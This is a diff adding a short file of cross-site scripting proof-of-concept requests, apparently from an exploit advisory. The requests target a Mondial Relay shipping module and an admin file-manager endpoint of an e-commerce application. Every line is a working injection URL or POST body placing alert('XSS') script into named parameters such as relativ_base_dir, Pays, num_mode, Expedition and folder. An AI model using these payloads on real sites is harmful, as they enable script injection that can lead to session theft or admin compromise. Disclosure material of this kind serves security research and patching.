@@ -1,0 +1,12 @@
+http://www.example.com/modules/mondialrelay/googlemap.php?relativ_base_dir=&gt;&#039;);alert(&#039;XSS&#039;);
+http://www.example.com/modules/mondialrelay/googlemap.php?relativ_base_dir=&quot;&gt;&#039;);alert(&#039;XSS&#039;);
+http://&lt;app_base&gt;/modules/mondialrelay/googlemap.php?Pays=&#039;);alert(&#039;XSS&#039;);
+
+GET: http://&lt;app_base&gt;/modules/mondialrelay/kit_mondialrelay/RechercheDetailPointRelais_ajax.php
+POST: num_mode=&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;
+
+GET: http://&lt;app_base&gt;/modules/mondialrelay/kit_mondialrelay/SuiviExpedition_ajax.php
+POST: Expedition=&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt; 
+
+GET: http://&lt;app_base&gt;/admin/ajaxfilemanager/ajax_save_text.php
+POST: folder=&lt;script&gt;alert(&#039;XSS 1&#039;);&lt;/script&gt;&amp;name=&lt;script&gt;alert(&#039;XSS 2&#039;);&lt;/script&gt; 
